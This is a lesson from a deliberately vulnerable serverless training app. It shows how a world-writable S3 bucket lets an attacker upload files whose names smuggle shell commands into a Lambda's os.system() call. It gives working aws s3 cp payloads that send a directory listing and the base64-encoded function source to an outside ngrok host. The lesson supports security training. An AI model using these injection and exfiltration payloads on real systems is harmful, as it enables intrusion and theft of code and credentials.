
# LESSON #4: Insecure Cloud Configuration

The DVSA is using cloud storage (i.e. S3 bucket) to upload order receipts. After a payment is processed successfully, a receipts is issued and uploaded to the bucket. When the order is processed for shipment, the file is downloaded from the bucket, modified and uploaded back as a final format receipt that is sent to the user via email.

However, since the S3 is configured insecurely, it is possible to upload files to the bucket with any AWS account. For example, if you install the aws-sdk, you can simply run the command: ```aws s3 cp /path/to/local/file s3://DVSA-RECEIPTS-BUCKET-{id}```

![alt s3-upload](https://i.imgur.com/K3sE1pf.png)

*Note, that you won't be able to run ```ls``` with an account different thatn the account where the DVSA is deployed, since it is misconfigured with WRITE permissions, and not with READ. At least not yet :)*

Let's see how to exploit it:

1. If you completed at least one order, you will receive an email with a link to download the receipt. It should look something like that:

![alt receript-sample](https://i.imgur.com/XwcHgF3.png)


You can notice that the path to the file in the bucket is the date. e.g. 2018/12/24/{receipt-uuid}.txt.

2. So let's fake a receipt and see what happens. Using the aws-sdk we can simply run the command:

```
aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?data="$(ls)";echo x.raw' --profile hacker
```
(The *echo x.raw* at the end of the file name is used to trigger the function, which is only triggered when a .raw file is created).

![alt ls](https://i.imgur.com/h9mw2qV.png)


3. We know the file's name, let's extract its code:
```
aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null;curl 0c971764.ngrok.io?code="$(cat lambda_function.py | base64 --wrap=0)" echo x.raw' --profile hacker
```

We now have the code in Base64 (I cut out most of it for a better screenshot).
![alt b64-code](https://i.imgur.com/KcklwO0.png)


Let's decode: ```echo <BASE64_STRING> | base64 --decode > /tmp/lambda.py```

![alt code](https://i.imgur.com/GD3YwJg.png)

We can now see the vulnerable code - os.system() - which uses the name of the uploaded file as part of the command. 

You now have all the information further exploit it, [stealing keys](../LESSONS/LESSON_06.md) or executing any other command.





